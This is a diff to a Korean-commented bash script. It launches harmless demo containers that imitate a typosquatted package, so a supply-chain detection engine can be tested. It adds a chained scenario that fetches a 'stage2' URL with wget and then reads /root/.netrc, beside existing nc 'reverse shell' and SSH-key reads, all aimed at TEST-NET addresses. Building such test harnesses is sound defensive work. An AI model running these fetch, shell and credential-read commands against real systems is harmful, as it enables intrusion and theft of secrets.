@@ -1,9 +1,10 @@
 #!/usr/bin/env bash
 # 타이포스쿼팅 패키지를 흉내 낸 데모 컨테이너(pkg-reqeusts). 전부 무해한 시뮬레이션이다.
 #
-#   SCENARIO=all|shell|revshell|direct-ip|domain|dns-exfil|udp   (기본 all = 아래 순서로 하나씩)
+#   SCENARIO=all|shell|revshell|direct-ip|domain|dns-exfil|udp|chain   (기본 all = 아래 순서로 하나씩, chain 은 따로만)
 #   LOOP=1  각 시나리오를 10초마다 반복
 #   DRY=1   docker 를 부르지 않고 넘길 인자만 출력(시나리오 분리 확인용)
+#   CHAIN_GAP=11  chain 의 마지막 단계(파일 열기)를 이만큼(초) 늦춘다 — 창 10초를 넘기면 놓쳐야 정상(음성 대조군)
 #
 # 시나리오마다 컨테이너를 따로 띄우고, 그 시나리오의 코드만 넘긴다.
 # (한 덩어리로 넘기면 PID1 인자에 다른 시나리오의 문자열이 섞여 엉뚱한 규칙에 먼저 걸린다.)
@@ -13,6 +14,8 @@
 #   domain    python   example.com:443 TCP (IANA 예약 도메인, 실제로 해석됨 → 목적지 도메인이 붙는다)
 #   dns-exfil python   48자 hex 라벨 .exfil.example A 질의 + data.exfil.example TXT 질의 (예약 TLD, NXDOMAIN — 데이터는 나가지 않는다)
 #   udp       python   203.0.113.7:53·4444 UDP 2개 — 엔진은 TCP 와 DNS(53 · 5353)만 관찰하므로 일반 UDP 는 "보이지 않는" 음성 대조군
+#   chain     busybox  연쇄 규칙(11/04): wget 실행 → 203.0.113.7:80 연결 시도 → 1초 뒤 없는 /root/.netrc 열기 시도(10초 창 안).
+#             기본 정책 no-shell-download(kill)가 wget 에서 먼저 격리하므로, 연쇄를 보려면 그 규칙을 dryRun 으로 둔다. all 에는 넣지 않는다
 #
 # 참고: TEST-NET 목적지는 접속이 실패할 때(타임아웃 약 3초 뒤) connect 이벤트가 나오므로
 #       격리도 그 뒤에 일어난다. 실제로 도달 가능한 서버면 즉시 나온다.
@@ -30,6 +33,13 @@ cat /root/.ssh/id_rsa >/dev/null 2>&1 || true'
 
 sh_revshell='echo "[demo] revshell start"
 timeout 3 nc 203.0.113.7 4444 </dev/null >/dev/null 2>&1 || true'
+
+# connect 이벤트는 TEST-NET 접속이 실패할 때(약 3초 뒤) 나오므로, 파일 열기는 그 뒤 1초에 둔다(순서가 뒤집히지 않게)
+# shellcheck disable=SC2016  # ${CHAIN_GAP} 는 컨테이너 안의 sh 가 펼친다(호스트에서 펼치지 않는다)
+sh_chain='echo "[demo] chain start"
+timeout 3 wget -q -O /dev/null http://203.0.113.7/stage2 || true
+sleep "${CHAIN_GAP:-1}"
+cat /root/.netrc >/dev/null 2>&1 || true'
 
 # ── python 시나리오 본문 ──────────────────────────────────────────────
 py_direct_ip='print("[demo] direct-ip start", flush=True)
@@ -88,8 +98,8 @@ for port in (53, 4444):
 build() {
   local id=$1 body
   case "$id" in
-    shell|revshell)
-      [ "$id" = shell ] && body=$sh_shell || body=$sh_revshell
+    shell|revshell|chain)
+      case "$id" in shell) body=$sh_shell ;; revshell) body=$sh_revshell ;; chain) body=$sh_chain ;; esac
       image=$BUSYBOX
       cmd=(sh -c "while :; do
 $body
@@ -107,7 +117,7 @@ $(printf '%s\n' "$body" | sed 's/^/    /')
 print(\"[demo] done; idling\", flush=True)
 time.sleep(3600)")
       ;;
-    *) echo "unknown SCENARIO=$id (all|shell|revshell|direct-ip|domain|dns-exfil|udp)" >&2; exit 1 ;;
+    *) echo "unknown SCENARIO=$id (all|shell|revshell|direct-ip|domain|dns-exfil|udp|chain)" >&2; exit 1 ;;
   esac
 }
 
@@ -115,7 +125,7 @@ launch() {
   local id=$1
   build "$id"
   local args=(run -d --name "$name" --label supplyguard.demo=attacker
-              -e SCENARIO="$id" -e LOOP="${LOOP:-}" "$image" "${cmd[@]}")
+              -e SCENARIO="$id" -e LOOP="${LOOP:-}" -e CHAIN_GAP="${CHAIN_GAP:-1}" "$image" "${cmd[@]}")
   if [ -n "${DRY:-}" ]; then
     echo "### SCENARIO=$id"
     printf 'docker'; printf ' %q' "${args[@]}"; echo
